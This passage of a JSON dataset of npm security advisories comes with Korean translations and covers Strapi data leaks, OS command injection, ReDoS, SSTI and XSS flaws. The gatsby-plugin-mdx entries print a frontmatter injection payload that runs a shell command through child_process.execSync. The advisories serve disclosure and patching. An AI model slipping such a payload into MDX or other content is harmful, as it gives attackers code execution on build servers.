    "descriptionKR": "Strapi 관리 패널에 대한 액세스 권한이 있는 인증된 사용자는 인증된 사용자가 액세스할 수 있는 콘텐츠 유형에 API 사용자와의 관계(from:users-permissions)가 포함된 경우 API 사용자에 대한 이메일 및 암호 재설정 토큰과 같은 개인 정보 및 민감한 데이터를 볼 수 있습니다. API 사용자의 이러한 세부 정보가 직간접적인 관계를 통해 관리자 패널 내의 JSON 응답에서 유출될 수 있는 많은 시나리오가 있습니다. 이 정보에 액세스하면 암호 재설정 API 엔드포인트가 활성화된 경우 사용자가 이러한 사용자의 계정을 손상시킬 수 있습니다. 최악의 시나리오에서는 권한이 낮은 사용자가 권한이 높은 API 계정에 액세스할 수 있으며 모든 데이터를 읽고 수정할 수 있을 뿐만 아니라 다른 모든 사용자의 권한을 취소하여 관리자 패널과 API에 대한 액세스를 차단할 수 있습니다."
  },
  {
    "description": "An authenticated user with access to the Strapi admin panel can view private and sensitive data, such as email and password reset tokens, for other admin panel users that have a relationship (e.g., created by, updated by) with content accessible to the authenticated user. For example, a low-privileged “author” role account can view these details in the JSON response for an “editor” or “super admin” that has updated one of the author’s blog posts. There are also many other scenarios where such details from other users can leak in the JSON response, either through a direct or indirect relationship. Access to this information enables a user to compromise other users’ accounts by successfully invoking the password reset workflow. In a worst-case scenario, a low-privileged user could get access to a “super admin” account with full control over the Strapi instance, and could read and modify any data as well as block access to both the admin panel and API by revoking privileges for all other users.",
    "identifiers": "GHSA : GHSA-f6fm-r26q-p747\nCVE : CVE-2022-30617",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:36Z",
    "publishedAt": "2022-05-20T00:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-30617\nhttps://www.synopsys.com/blogs/software-security/cyrc-advisory-strapi\nhttps://github.com/advisories/GHSA-f6fm-r26q-p747",
    "name": "@strapi/strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.0.0-beta.14",
    "identifier": "4.0.0-beta.15",
    "descriptionKR": "Strapi 관리자 패널에 대한 액세스 권한이 있는 인증된 사용자는 인증된 사용자가 액세스할 수 있는 콘텐츠와 관계(예: 만든 사람, 업데이트한 사람)가 있는 다른 관리자 패널 사용자의 이메일 및 암호 재설정 토큰과 같은 개인 정보 및 민감한 데이터를 볼 수 있습니다. . 예를 들어 권한이 낮은 \"작성자\" 역할 계정은 작성자의 블로그 게시물 중 하나를 업데이트한 \"편집자\" 또는 \"최고 관리자\"에 대한 JSON 응답에서 이러한 세부 정보를 볼 수 있습니다. 직접적 또는 간접적 관계를 통해 다른 사용자의 이러한 세부 정보가 JSON 응답에서 유출될 수 있는 다른 많은 시나리오도 있습니다. 이 정보에 액세스하면 사용자가 암호 재설정 워크플로를 성공적으로 호출하여 다른 사용자의 계정을 손상시킬 수 있습니다. 최악의 시나리오에서 권한이 낮은 사용자는 Strapi 인스턴스를 완전히 제어할 수 있는 \"슈퍼 관리자\" 계정에 액세스할 수 있으며 모든 데이터를 읽고 수정할 수 있을 뿐만 아니라 관리자 패널과 API에 대한 액세스를 모두 차단할 수 있습니다. 다른 모든 사용자의 권한을 취소합니다."
  },
  {
    "description": "An authenticated user with access to the Strapi admin panel can view private and sensitive data, such as email and password reset tokens, for other admin panel users that have a relationship (e.g., created by, updated by) with content accessible to the authenticated user. For example, a low-privileged “author” role account can view these details in the JSON response for an “editor” or “super admin” that has updated one of the author’s blog posts. There are also many other scenarios where such details from other users can leak in the JSON response, either through a direct or indirect relationship. Access to this information enables a user to compromise other users’ accounts by successfully invoking the password reset workflow. In a worst-case scenario, a low-privileged user could get access to a “super admin” account with full control over the Strapi instance, and could read and modify any data as well as block access to both the admin panel and API by revoking privileges for all other users.",
    "identifiers": "GHSA : GHSA-f6fm-r26q-p747\nCVE : CVE-2022-30617",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:36Z",
    "publishedAt": "2022-05-20T00:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-30617\nhttps://www.synopsys.com/blogs/software-security/cyrc-advisory-strapi\nhttps://github.com/advisories/GHSA-f6fm-r26q-p747",
    "name": "strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.6.9",
    "identifier": "3.6.9",
    "descriptionKR": "Strapi 관리자 패널에 대한 액세스 권한이 있는 인증된 사용자는 인증된 사용자가 액세스할 수 있는 콘텐츠와 관계(예: 만든 사람, 업데이트한 사람)가 있는 다른 관리자 패널 사용자의 이메일 및 암호 재설정 토큰과 같은 개인 정보 및 민감한 데이터를 볼 수 있습니다. . 예를 들어 권한이 낮은 \"작성자\" 역할 계정은 작성자의 블로그 게시물 중 하나를 업데이트한 \"편집자\" 또는 \"최고 관리자\"에 대한 JSON 응답에서 이러한 세부 정보를 볼 수 있습니다. 직접적 또는 간접적 관계를 통해 다른 사용자의 이러한 세부 정보가 JSON 응답에서 유출될 수 있는 다른 많은 시나리오도 있습니다. 이 정보에 액세스하면 사용자가 암호 재설정 워크플로를 성공적으로 호출하여 다른 사용자의 계정을 손상시킬 수 있습니다. 최악의 시나리오에서 권한이 낮은 사용자는 Strapi 인스턴스를 완전히 제어할 수 있는 \"슈퍼 관리자\" 계정에 액세스할 수 있으며 모든 데이터를 읽고 수정할 수 있을 뿐만 아니라 관리자 패널과 API에 대한 액세스를 모두 차단할 수 있습니다. 다른 모든 사용자의 권한을 취소합니다."
  },
  {
    "description": "OS Command injection vulnerability in Mintzo Docker-Tester through 1.2.1 allows attackers to execute arbitrary commands via shell metacharacters in the 'ports' entry of a crafted docker-compose.yml file.",
    "identifiers": "GHSA : GHSA-rj88-4777-828h\nCVE : CVE-2021-34079",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:00:56Z",
    "publishedAt": "2022-06-03T00:00:58Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34079\nhttps://advisory.checkmarx.net/advisory/CX-2021-4786\nhttps://www.npmjs.com/package/docker-tester\nhttps://github.com/advisories/GHSA-rj88-4777-828h",
    "name": "docker-tester",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.1",
    "descriptionKR": "1.2.1을 통한 Mintzo Docker-Tester의 OS 명령 삽입 취약성으로 인해 공격자는 제작된 docker-compose.yml 파일의 'ports' 항목에 있는 셸 메타문자를 통해 임의의 명령을 실행할 수 있습니다."
  },
  {
    "description": "### Impact\nThe gatsby-plugin-mdx plugin prior to versions 3.15.2 and 2.14.1 passes input through to the `gray-matter` npm package, which is vulnerable to JavaScript injection in its default configuration, unless input is sanitized.  The vulnerability is present when passing input in both webpack (MDX files in `src/pages` or MDX file imported as component in frontend / React code) and data mode (querying MDX nodes via GraphQL).  Injected JavaScript executes in the context of the build server.\n\nTo exploit this vulnerability untrusted/unsanitized input would need to be sourced or added into an MDX file.  The following MDX payload demonstrates a vulnerable configuration:\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n--- \n```\n\n### Patches\nA patch has been introduced in `gatsby-plugin-mdx@3.15.2` and `gatsby-plugin-mdx@2.14.1` which mitigates the issue by disabling the `gray-matter` JavaScript Frontmatter engine.  The patch introduces a new option, `JSFrontmatterEngine` which is set to `false` by default.  When setting `JSFrontmatterEngine` to `true`, input passed to `gatsby-plugin-mdx` must be sanitized before processing to avoid a security risk.  Warnings are displayed when enabling `JSFrontmatterEngine` to `true` or if it appears that the MDX input is attempting to use the Frontmatter engine.\n\n### Workarounds\nIf an older version of `gatsby-plugin-mdx` must be used, input passed into the plugin should be sanitized ahead of processing.\n\n**We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.**\n\n### Credits\nWe would like to thank Snyk [snyk.io] for initially bringing the issue to our attention, as well as Feng Xiao and Zhongfu Su, who reported the issue to Snyk.\n\n### For more information\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).\n",
    "identifiers": "GHSA : GHSA-mj46-r4gr-5x83\nCVE : CVE-2022-25863",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:23Z",
    "publishedAt": "2022-06-03T22:32:06Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-mj46-r4gr-5x83\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25863\nhttps://github.com/gatsbyjs/gatsby/pull/35830\nhttps://github.com/gatsbyjs/gatsby/pull/35830/commits/f214eb0694c61e348b2751cecd1aace2046bc46e\nhttps://drive.google.com/file/d/1EoCzbwTWOM8-fjvwMbH3bqcZ2iKksxTW/view?usp=sharing\nhttps://snyk.io/vuln/SNYK-JS-GATSBYPLUGINMDX-2405699\nhttps://github.com/advisories/GHSA-mj46-r4gr-5x83",
    "name": "gatsby-plugin-mdx",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.15.2",
    "identifier": "3.15.2",
    "descriptionKR": "### 영향\n버전 3.15.2 및 2.14.1 이전의 gatsby-plugin-mdx 플러그인은 'gray-matter' npm 패키지로 입력을 전달합니다. 이 패키지는 입력이 삭제되지 않는 한 기본 구성에서 JavaScript 주입에 취약합니다. 이 취약점은 웹팩(`src/pages`의 MDX 파일 또는 프런트엔드/React 코드의 구성 요소로 가져온 MDX 파일)과 데이터 모드(GraphQL을 통해 MDX 노드 쿼리) 모두에서 입력을 전달할 때 존재합니다. 주입된 JavaScript는 빌드 서버의 컨텍스트에서 실행됩니다.\n\n이 취약점을 악용하려면 신뢰할 수 없거나 삭제되지 않은 입력을 소싱하거나 MDX 파일에 추가해야 합니다. 다음 MDX 페이로드는 취약한 구성을 보여줍니다.\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n---\n```\n\n### 패치\n`gatsby-plugin-mdx@3.15.2` 및 `gatsby-plugin-mdx@2.14.1`에 `gray-matter` JavaScript Frontmatter 엔진을 비활성화하여 문제를 완화하는 패치가 도입되었습니다. 이 패치는 기본적으로 'false'로 설정되는 새로운 옵션인 'JSFrontmatterEngine'을 도입합니다. `JSFrontmatterEngine`을 `true`로 설정할 때 `gatsby-plugin-mdx`로 전달된 입력은 보안 위험을 피하기 위해 처리 전에 삭제되어야 합니다. 'JSFrontmatterEngine'을 'true'로 활성화하거나 MDX 입력이 Frontmatter 엔진을 사용하려고 시도하는 것으로 나타나면 경고가 표시됩니다.\n\n### 해결 방법\n이전 버전의 `gatsby-plugin-mdx`를 사용해야 하는 경우 플러그인에 전달된 입력은 처리 전에 삭제되어야 합니다.\n\n**최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 프로젝트를 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 업그레이드하는 것이 좋습니다.**\n\n### 크레딧\n처음에 문제를 알려준 Snyk [snyk.io]와 Snyk에 문제를 보고한 Feng Xiao와 Zhongfu Su에게 감사드립니다.\n\n### 자세한 내용은\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nThe gatsby-plugin-mdx plugin prior to versions 3.15.2 and 2.14.1 passes input through to the `gray-matter` npm package, which is vulnerable to JavaScript injection in its default configuration, unless input is sanitized.  The vulnerability is present when passing input in both webpack (MDX files in `src/pages` or MDX file imported as component in frontend / React code) and data mode (querying MDX nodes via GraphQL).  Injected JavaScript executes in the context of the build server.\n\nTo exploit this vulnerability untrusted/unsanitized input would need to be sourced or added into an MDX file.  The following MDX payload demonstrates a vulnerable configuration:\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n--- \n```\n\n### Patches\nA patch has been introduced in `gatsby-plugin-mdx@3.15.2` and `gatsby-plugin-mdx@2.14.1` which mitigates the issue by disabling the `gray-matter` JavaScript Frontmatter engine.  The patch introduces a new option, `JSFrontmatterEngine` which is set to `false` by default.  When setting `JSFrontmatterEngine` to `true`, input passed to `gatsby-plugin-mdx` must be sanitized before processing to avoid a security risk.  Warnings are displayed when enabling `JSFrontmatterEngine` to `true` or if it appears that the MDX input is attempting to use the Frontmatter engine.\n\n### Workarounds\nIf an older version of `gatsby-plugin-mdx` must be used, input passed into the plugin should be sanitized ahead of processing.\n\n**We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.**\n\n### Credits\nWe would like to thank Snyk [snyk.io] for initially bringing the issue to our attention, as well as Feng Xiao and Zhongfu Su, who reported the issue to Snyk.\n\n### For more information\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).\n",
    "identifiers": "GHSA : GHSA-mj46-r4gr-5x83\nCVE : CVE-2022-25863",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:23Z",
    "publishedAt": "2022-06-03T22:32:06Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-mj46-r4gr-5x83\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-25863\nhttps://github.com/gatsbyjs/gatsby/pull/35830\nhttps://github.com/gatsbyjs/gatsby/pull/35830/commits/f214eb0694c61e348b2751cecd1aace2046bc46e\nhttps://drive.google.com/file/d/1EoCzbwTWOM8-fjvwMbH3bqcZ2iKksxTW/view?usp=sharing\nhttps://snyk.io/vuln/SNYK-JS-GATSBYPLUGINMDX-2405699\nhttps://github.com/advisories/GHSA-mj46-r4gr-5x83",
    "name": "gatsby-plugin-mdx",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.14.1",
    "identifier": "2.14.1",
    "descriptionKR": "### 영향\n버전 3.15.2 및 2.14.1 이전의 gatsby-plugin-mdx 플러그인은 'gray-matter' npm 패키지로 입력을 전달합니다. 이 패키지는 입력이 삭제되지 않는 한 기본 구성에서 JavaScript 주입에 취약합니다. 이 취약점은 웹팩(`src/pages`의 MDX 파일 또는 프런트엔드/React 코드의 구성 요소로 가져온 MDX 파일)과 데이터 모드(GraphQL을 통해 MDX 노드 쿼리) 모두에서 입력을 전달할 때 존재합니다. 주입된 JavaScript는 빌드 서버의 컨텍스트에서 실행됩니다.\n\n이 취약점을 악용하려면 신뢰할 수 없거나 삭제되지 않은 입력을 소싱하거나 MDX 파일에 추가해야 합니다. 다음 MDX 페이로드는 취약한 구성을 보여줍니다.\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n---\n```\n\n### 패치\n`gatsby-plugin-mdx@3.15.2` 및 `gatsby-plugin-mdx@2.14.1`에 `gray-matter` JavaScript Frontmatter 엔진을 비활성화하여 문제를 완화하는 패치가 도입되었습니다. 이 패치는 기본적으로 'false'로 설정되는 새로운 옵션인 'JSFrontmatterEngine'을 도입합니다. `JSFrontmatterEngine`을 `true`로 설정할 때 `gatsby-plugin-mdx`로 전달된 입력은 보안 위험을 피하기 위해 처리 전에 삭제되어야 합니다. 'JSFrontmatterEngine'을 'true'로 활성화하거나 MDX 입력이 Frontmatter 엔진을 사용하려고 시도하는 것으로 나타나면 경고가 표시됩니다.\n\n### 해결 방법\n이전 버전의 `gatsby-plugin-mdx`를 사용해야 하는 경우 플러그인에 전달된 입력은 처리 전에 삭제되어야 합니다.\n\n**최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 프로젝트를 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 업그레이드하는 것이 좋습니다.**\n\n### 크레딧\n처음에 문제를 알려준 Snyk [snyk.io]와 Snyk에 문제를 보고한 Feng Xiao와 Zhongfu Su에게 감사드립니다.\n\n### 자세한 내용은\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the jquery-validation npm package, when an attacker is able to supply arbitrary input to the url2 method",
    "identifiers": "GHSA : GHSA-j9m2-h2pv-wvph\nCVE : CVE-2021-43306",
    "severity": "LOW",
    "updatedAt": "2023-07-19T19:58:03Z",
    "publishedAt": "2022-06-03T00:00:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43306\nhttps://research.jfrog.com/vulnerabilities/jquery-validation-redos-xray-211348/\nhttps://github.com/jquery-validation/jquery-validation/commit/69cb17ed774b427f7e2ffcdf197968231725c30e\nhttps://github.com/advisories/GHSA-j9m2-h2pv-wvph",
    "name": "jquery-validation",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.19.4",
    "identifier": "1.19.4",
    "descriptionKR": "공격자가 url2 메서드에 임의의 입력을 제공할 수 있는 경우 jquery-validation npm 패키지에서 기하급수적인 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the semver-regex npm package, when an attacker is able to supply arbitrary input to the test() method",
    "identifiers": "GHSA : GHSA-4x5v-gmq8-25ch\nCVE : CVE-2021-43307",
    "severity": "LOW",
    "updatedAt": "2023-07-19T19:58:14Z",
    "publishedAt": "2022-06-03T00:01:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43307\nhttps://research.jfrog.com/vulnerabilities/semver-regex-redos-xray-211349/\nhttps://github.com/sindresorhus/semver-regex/commit/d8ba39a528c1027c43ab23f12eec28ca4d40dd0c\nhttps://github.com/advisories/GHSA-4x5v-gmq8-25ch",
    "name": "semver-regex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.0.3",
    "identifier": "4.0.3",
    "descriptionKR": "공격자가 test() 메서드에 임의의 입력을 제공할 수 있는 경우 semver-regex npm 패키지에서 기하급수적인 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the semver-regex npm package, when an attacker is able to supply arbitrary input to the test() method",
    "identifiers": "GHSA : GHSA-4x5v-gmq8-25ch\nCVE : CVE-2021-43307",
    "severity": "LOW",
    "updatedAt": "2023-07-19T19:58:14Z",
    "publishedAt": "2022-06-03T00:01:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43307\nhttps://research.jfrog.com/vulnerabilities/semver-regex-redos-xray-211349/\nhttps://github.com/sindresorhus/semver-regex/commit/d8ba39a528c1027c43ab23f12eec28ca4d40dd0c\nhttps://github.com/advisories/GHSA-4x5v-gmq8-25ch",
    "name": "semver-regex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.4",
    "identifier": "3.1.4",
    "descriptionKR": "공격자가 test() 메서드에 임의의 입력을 제공할 수 있는 경우 semver-regex npm 패키지에서 기하급수적인 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the markdown-link-extractor npm package, when an attacker is able to supply arbitrary input to the module's exported function",
    "identifiers": "GHSA : GHSA-mmh6-m7v9-5956\nCVE : CVE-2021-43308",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:07:35Z",
    "publishedAt": "2022-06-03T00:01:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43308\nhttps://research.jfrog.com/vulnerabilities/markdown-link-extractor-redos-xray-211350/\nhttps://github.com/advisories/GHSA-mmh6-m7v9-5956",
    "name": "markdown-link-extractor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.0.1",
    "identifier": "4.0.1",
    "descriptionKR": "공격자가 모듈의 내보낸 함수에 임의의 입력을 제공할 수 있는 경우 markdown-link-extractor npm 패키지에서 지수 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the markdown-link-extractor npm package, when an attacker is able to supply arbitrary input to the module's exported function",
    "identifiers": "GHSA : GHSA-mmh6-m7v9-5956\nCVE : CVE-2021-43308",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:07:35Z",
    "publishedAt": "2022-06-03T00:01:00Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-43308\nhttps://research.jfrog.com/vulnerabilities/markdown-link-extractor-redos-xray-211350/\nhttps://github.com/advisories/GHSA-mmh6-m7v9-5956",
    "name": "markdown-link-extractor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.2",
    "identifier": "3.0.2",
    "descriptionKR": "공격자가 모듈의 내보낸 함수에 임의의 입력을 제공할 수 있는 경우 markdown-link-extractor npm 패키지에서 지수 ReDoS(정규식 서비스 거부)가 트리거될 수 있습니다."
  },
  {
    "description": "OS Command Injection vulnerability in allenhwkim proctree through 0.1.1 and commit 0ac10ae575459457838f14e21d5996f2fa5c7593 for Node.js, allows attackers to execute arbitrary commands via the fix function.",
    "identifiers": "GHSA : GHSA-cv76-rv4h-4mqc\nCVE : CVE-2021-34082",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:00:58Z",
    "publishedAt": "2022-06-03T00:00:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34082\nhttps://advisory.checkmarx.net/advisory/CX-2021-4783\nhttps://github.com/allenhwkim/proctree/blob/master/index.js#L46\nhttps://github.com/advisories/GHSA-cv76-rv4h-4mqc",
    "name": "proctree",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.1",
    "descriptionKR": "Node.js용 allenhwkim proctree 0.1.1 및 커밋 0ac10ae575459457838f14e21d5996f2fa5c7593의 OS 명령 주입 취약성으로 인해 공격자가 수정 기능을 통해 임의의 명령을 실행할 수 있습니다."
  },
  {
    "description": "Google-it is a Node.js package which allows its users to send search queries to Google and receive the results in a JSON format. When using the 'Open in browser' option in versions up to 1.6.2, google-it will unsafely concat the result's link retrieved from google to a shell command, potentially exposing the server to RCE.",
    "identifiers": "GHSA : GHSA-7xhv-mpjw-422f\nCVE : CVE-2021-34083",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:25Z",
    "publishedAt": "2022-06-03T00:00:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34083\nhttps://advisory.checkmarx.net/advisory/CX-2021-4777\nhttps://github.com/PatNeedham/google-it/blob/v1.6.2/lib/googleIt.js#L59\nhttps://github.com/PatNeedham/google-it/blob/v1.6.2/src/googleIt.js#L34\nhttps://github.com/advisories/GHSA-7xhv-mpjw-422f",
    "name": "google-it",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.6.2",
    "descriptionKR": "Google-it은 사용자가 Google에 검색어를 보내고 결과를 JSON 형식으로 받을 수 있는 Node.js 패키지입니다. 1.6.2까지의 버전에서 '브라우저에서 열기' 옵션을 사용할 때 google-it은 google에서 검색된 결과의 링크를 셸 명령에 안전하지 않게 연결하여 잠재적으로 서버를 RCE에 노출시킵니다."
  },
  {
    "description": "OS command injection vulnerability in Turistforeningen node-s3-uploader through 2.0.3 for Node.js allows attackers to execute arbitrary commands via the metadata() function.",
    "identifiers": "GHSA : GHSA-gwp3-f7mr-qpfv\nCVE : CVE-2021-34084",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:07:35Z",
    "publishedAt": "2022-06-03T00:00:59Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34084\nhttps://advisory.checkmarx.net/advisory/CX-2021-4776\nhttps://github.com/advisories/GHSA-gwp3-f7mr-qpfv",
    "name": "s3-uploader",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.0.3",
    "descriptionKR": "Node.js용 Turistforeningen node-s3-uploader 2.0.3의 OS 명령 주입 취약성은 공격자가 metadata() 함수를 통해 임의의 명령을 실행할 수 있도록 합니다."
  },
  {
    "description": "A Server-Side Template Injection (SSTI) was discovered in Form.io 2.0.0. This leads to Remote Code Execution during deletion of the default Email template URL.",
    "identifiers": "GHSA : GHSA-52vj-mr2j-f8jh\nCVE : CVE-2020-28246",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:00:56Z",
    "publishedAt": "2022-06-03T00:00:58Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28246\nhttps://github.com/formio/enterprise-release/blob/master/API-Server-Change-Log.md\nhttps://github.com/advisories/GHSA-52vj-mr2j-f8jh",
    "name": "formio",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.0.0",
    "descriptionKR": "Form.io 2.0.0에서 SSTI(Server-Side Template Injection)가 발견되었습니다. 이로 인해 기본 이메일 템플릿 URL을 삭제하는 동안 원격 코드 실행이 발생합니다."
  },
  {
    "description": "lifion-verify-dependencies through 1.1.0 is vulnerable to OS command injection via a crafted dependency name on the scanned project's package.json file.",
    "identifiers": "GHSA : GHSA-rphm-c8gw-3r38\nCVE : CVE-2021-34078",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:08Z",
    "publishedAt": "2022-06-03T00:00:58Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34078\nhttps://github.com/lifion/lifion-verify-deps/commit/be1133d5b78e3caa0004fa60207013dca4e1bf38\nhttps://advisory.checkmarx.net/advisory/CX-2021-4785\nhttps://github.com/advisories/GHSA-rphm-c8gw-3r38",
    "name": "lifion-verify-deps",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.0",
    "identifier": "1.2.0",
    "descriptionKR": "1.1.0을 통한 lifion-verify-dependencies는 스캔한 프로젝트의 package.json 파일에서 조작된 종속성 이름을 통한 OS 명령 주입에 취약합니다."
  },
  {
    "description": "OS Command Injection vulnerability in es128 ssl-utils 1.0.0 for Node.js allows attackers to execute arbitrary commands via unsanitized shell metacharacters provided to the createCertRequest() and the createCert() functions.",
    "identifiers": "GHSA : GHSA-552j-pv39-f3jf\nCVE : CVE-2021-34080",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:08:05Z",
    "publishedAt": "2022-06-03T00:00:58Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34080\nhttps://advisory.checkmarx.net/advisory/CX-2021-4782\nhttps://github.com/advisories/GHSA-552j-pv39-f3jf",
    "name": "ssl-utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "Node.js용 es128 ssl-utils 1.0.0의 OS 명령 주입 취약성으로 인해 공격자는 createCertRequest() 및 createCert() 함수에 제공된 삭제되지 않은 셸 메타문자를 통해 임의의 명령을 실행할 수 있습니다."
  },
  {
    "description": "OS Command Injection vulnerability in bbultman gitsome through 0.2.3 allows attackers to execute arbitrary commands via a crafted tag name of the target git repository.",
    "identifiers": "GHSA : GHSA-9v73-x562-wv5x\nCVE : CVE-2021-34081",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:20Z",
    "publishedAt": "2022-06-03T00:00:58Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-34081\nhttps://advisory.checkmarx.net/advisory/CX-2021-4780\nhttps://www.npmjs.com/package/gitsome\nhttps://github.com/advisories/GHSA-9v73-x562-wv5x",
    "name": "gitsome",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.2.3",
    "descriptionKR": "0.2.3까지의 bbultman gitsome의 OS 명령 삽입 취약성으로 인해 공격자는 대상 git 리포지토리의 제작된 태그 이름을 통해 임의의 명령을 실행할 수 있습니다."
  },
  {
    "description": "### Impact\nThere is a potential Cross-Site Scripting (XSS) vulnerability where an arbitrary user is able to execute scripts on pages that are built with Hydrogen. This affects all versions of Hydrogen starting from version 0.10.0 to 0.18.0. This vulnerability is exploitable in applications whose hydrating data is user controlled. \n\n### Patches\nAll Hydrogen users should upgrade their project to v0.19.0.\n\n### Workarounds\nThere is no current workaround, and users should update as soon as possible.\n\nAdditionally, the Content Security Policy is not an effective mitigation for this vulnerability. \n\n### References\nGitHub: [Hydrogen v0.19.0](https://github.com/Shopify/hydrogen/releases/tag/%40shopify/hydrogen%400.19.0)\nFix PR: https://github.com/Shopify/hydrogen/pull/1272\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Shopify/hydrogen](https://github.com/Shopify/hydrogen/issues/new/choose)",
    "identifiers": "GHSA : GHSA-6j22-wv8g-894f\nCVE : CVE-2022-29230",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:01:41Z",
    "publishedAt": "2022-05-19T20:29:04Z",
    "references": "https://github.com/Shopify/hydrogen/security/advisories/GHSA-6j22-wv8g-894f\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29230\nhttps://github.com/Shopify/hydrogen/pull/1272\nhttps://github.com/Shopify/hydrogen/releases/tag/%40shopify/hydrogen%400.19.0\nhttps://github.com/advisories/GHSA-6j22-wv8g-894f",
    "name": "@shopify/hydrogen",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.10.0, < 0.19.0",
    "identifier": "0.19.0",
    "descriptionKR": "### 영향\n임의의 사용자가 Hydrogen으로 구축된 페이지에서 스크립트를 실행할 수 있는 잠재적인 XSS(교차 사이트 스크립팅) 취약점이 있습니다. 이것은 버전 0.10.0에서 0.18.0까지 모든 Hydrogen 버전에 영향을 미칩니다. 이 취약점은 하이드레이팅 데이터를 사용자가 제어하는 ​​애플리케이션에서 악용될 수 있습니다.\n\n### 패치\n모든 Hydrogen 사용자는 프로젝트를 v0.19.0으로 업그레이드해야 합니다.\n\n### 해결 방법\n현재 해결 방법은 없으며 사용자는 가능한 한 빨리 업데이트해야 합니다.\n\n또한 콘텐츠 보안 정책은 이 취약점에 대한 효과적인 완화가 아닙니다.\n\n### 참조\nGitHub: [Hydrogen v0.19.0](https://github.com/Shopify/hydrogen/releases/tag/%40shopify/hydrogen%400.19.0)\nPR 수정: https://github.com/Shopify/hydrogen/pull/1272\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [Shopify/hydrogen](https://github.com/Shopify/hydrogen/issues/new/choose)에서 문제 열기"
  },
  {
